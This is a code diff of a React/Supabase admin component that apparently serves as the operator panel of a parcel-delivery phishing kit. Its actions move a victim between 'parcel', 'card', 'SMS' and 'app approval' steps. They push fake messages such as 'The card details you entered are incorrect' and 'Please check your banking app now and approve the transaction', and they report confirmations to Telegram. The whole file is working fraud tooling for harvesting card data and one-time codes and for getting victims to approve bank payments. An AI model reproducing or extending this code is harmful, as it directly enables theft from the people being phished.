@@ -1,4 +1,3 @@
-import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -12,12 +11,9 @@ import {
   XCircle,
   Copy,
   Bell,
-  Pencil,
-  Link,
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
-import { EditParcelDialog } from "./EditParcelDialog";
 
 interface ClientSession {
   id: string;
@@ -36,8 +32,6 @@ interface ClientSession {
   origin: string | null;
   destination: string | null;
   estimated_delivery: string | null;
-  weight: string | null;
-  session_path: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -63,121 +57,124 @@ interface ClientRowProps {
 }
 
 export function ClientRow({ session, isSelected = false, onToggleSelect }: ClientRowProps) {
-  const [editDialogOpen, setEditDialogOpen] = useState(false);
-
-  const copyToClipboard = (text: string, label?: string) => {
+  const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
-    toast({ title: label || "Copied!" });
-  };
-
-  const copyClientUrl = () => {
-    if (session.session_path) {
-      const url = `${window.location.origin}/${session.session_path}`;
-      copyToClipboard(url, "Client URL copied!");
-    } else {
-      toast({ title: "No URL path available", variant: "destructive" });
-    }
-  };
-
-  // Helper function to update session via edge function
-  const updateSession = async (updates: Record<string, unknown>, successMsg: string) => {
-    try {
-      const token = sessionStorage.getItem("admin_token");
-      const { data, error } = await supabase.functions.invoke("admin-sessions", {
-        headers: token ? { Authorization: `Bearer ${token}` } : {},
-        body: { action: "update", sessionId: session.id, updates }
-      });
-      
-      if (error || !data?.success) {
-        console.error("Update failed:", error || data?.error);
-        toast({ title: "Error", description: "Failed to update", variant: "destructive" });
-        return;
-      }
-      toast({ title: successMsg });
-    } catch (err) {
-      console.error("Update error:", err);
-      toast({ title: "Error", description: "Failed to update", variant: "destructive" });
-    }
+    toast({ title: "Copied!" });
   };
 
   // Actions
-  const sendToSmsVerification = () => updateSession(
-    { current_step: 3, approval_type: null, verification_code: null },
-    "→ SMS"
-  );
+  const sendToSmsVerification = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 3, approval_type: null, verification_code: null })
+      .eq("id", session.id);
+    toast({ title: "→ SMS" });
+  };
 
-  const sendToAppApproval = () => updateSession(
-    { current_step: 3, approval_type: "app_pending", verification_code: null },
-    "→ App"
-  );
+  const sendToAppApproval = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
+      .eq("id", session.id);
+    toast({ title: "→ App" });
+  };
 
-  const sendWrongCardMessage = () => updateSession(
-    { 
-      current_step: 2,
-      approval_type: null,
-      admin_message: "The card details you entered are incorrect. Please check and try again.",
-      message_type: "error"
-    },
-    "Wrong card"
-  );
+  const sendWrongCardMessage = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        current_step: 2,
+        approval_type: null,
+        admin_message: "The card details you entered are incorrect. Please check and try again.",
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Wrong card" });
+  };
 
-  const sendWrongSmsMessage = () => updateSession(
-    { 
-      admin_message: "The verification code you entered is incorrect. Please check and try again.",
-      message_type: "error"
-    },
-    "Wrong SMS"
-  );
+  const sendWrongSmsMessage = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "The verification code you entered is incorrect. Please check and try again.",
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Wrong SMS" });
+  };
 
-  const sendWrongApprovalMessage = () => updateSession(
-    { 
-      admin_message: "Approval not received. Please try again in your banking app.",
-      message_type: "error"
-    },
-    "Wrong Approval"
-  );
+  const sendWrongApprovalMessage = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "Approval not received. Please try again in your banking app.",
+        message_type: "error"
+      })
+      .eq("id", session.id);
+    toast({ title: "Wrong Approval" });
+  };
 
-  const sendPushRequest = () => updateSession(
-    { 
-      admin_message: "Please check your banking app now and approve the transaction.",
-      message_type: "info"
-    },
-    "Push sent"
-  );
+  const sendPushRequest = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: "Please check your banking app now and approve the transaction.",
+        message_type: "info"
+      })
+      .eq("id", session.id);
+    toast({ title: "Push sent" });
+  };
 
-  const sendBackToParcel = () => updateSession(
-    { 
-      current_step: 1,
-      approval_type: null,
-      admin_message: null,
-      message_type: null
-    },
-    "→ Parcel"
-  );
+  const sendBackToParcel = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        current_step: 1,
+        approval_type: null,
+        admin_message: null,
+        message_type: null
+      })
+      .eq("id", session.id);
+    toast({ title: "→ Parcel" });
+  };
 
-  const sendBackToCard = () => updateSession(
-    { current_step: 2, approval_type: null },
-    "→ Card"
-  );
+  const sendBackToCard = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 2, approval_type: null })
+      .eq("id", session.id);
+    toast({ title: "→ Card" });
+  };
 
   const confirmPayment = async () => {
-    await updateSession({ current_step: 4, approval_type: "sms" }, "✓ Confirmed");
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 4, approval_type: "sms" })
+      .eq("id", session.id);
     await supabase.functions.invoke("send-telegram", {
       body: { message: `✅ SMS - #${session.session_code}` },
     });
+    toast({ title: "✓ Confirmed" });
   };
 
   const approvePayment = async () => {
-    await updateSession({ current_step: 4, approval_type: "app" }, "✓ Approved");
+    await supabase
+      .from("client_sessions")
+      .update({ current_step: 4, approval_type: "app" })
+      .eq("id", session.id);
     await supabase.functions.invoke("send-telegram", {
       body: { message: `✅ App - #${session.session_code}` },
     });
+    toast({ title: "✓ Approved" });
   };
 
-  const clearMessage = () => updateSession(
-    { admin_message: null, message_type: null },
-    "Cleared"
-  );
+  const clearMessage = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ admin_message: null, message_type: null })
+      .eq("id", session.id);
+    toast({ title: "Cleared" });
+  };
 
   const isWaiting = session.current_step === 2 && session.approval_type === "payment_waiting";
   const isVerifying = session.current_step === 3;
@@ -252,24 +249,6 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
 
       {/* Actions Row - Always Visible */}
       <div className="px-3 pb-3 flex flex-wrap gap-1.5">
-        <Button 
-          size="sm" 
-          variant="outline" 
-          className="h-7 text-xs" 
-          onClick={() => setEditDialogOpen(true)}
-        >
-          <Pencil className="w-3 h-3 mr-1" /> Edit
-        </Button>
-
-        <Button 
-          size="sm" 
-          variant="outline" 
-          className="h-7 text-xs text-blue-600 border-blue-300 hover:bg-blue-50" 
-          onClick={copyClientUrl}
-        >
-          <Link className="w-3 h-3 mr-1" /> Copy URL
-        </Button>
-
         <Button 
           size="sm" 
           variant="outline" 
@@ -373,22 +352,6 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
           <CheckCircle className="w-3 h-3 mr-1" /> Approve App
         </Button>
       </div>
-
-      {/* Edit Parcel Dialog */}
-      <EditParcelDialog
-        open={editDialogOpen}
-        onOpenChange={setEditDialogOpen}
-        sessionId={session.id}
-        sessionCode={session.session_code}
-        initialData={{
-          parcel_tracking: session.parcel_tracking,
-          amount: session.amount,
-          origin: session.origin,
-          destination: session.destination,
-          estimated_delivery: session.estimated_delivery,
-          weight: session.weight,
-        }}
-      />
     </div>
   );
 }
